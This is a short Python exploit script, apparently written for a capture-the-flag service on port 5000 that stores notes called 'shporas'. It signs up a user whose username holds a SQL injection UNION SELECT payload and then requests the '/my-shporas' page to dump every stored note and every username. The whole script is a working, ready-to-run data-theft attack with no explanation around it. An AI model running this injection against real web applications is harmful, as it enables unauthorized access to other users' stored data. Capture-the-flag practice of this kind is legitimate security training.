#!/usr/bin/env python3

import sys
import requests

from random import choice
from string import ascii_letters


def random_string():
    return ''.join(choice(ascii_letters) for _ in range(32))


host = sys.argv[1]
url = f'http://{host}:5000'

s = requests.Session()

payload = f'{random_string()}" UNION SELECT 1, 1, content, 1, 1, 1, 1 FROM shporas UNION SELECT 1, 1, username, 1, 1, 1, 1 FROM users; --'

resp = s.post(f'{url}/sign-up', data={
    'username': payload,
    'password': 'lolpwned'
})
resp = s.get(f'{url}/my-shporas')

print(resp.text, flush=True)
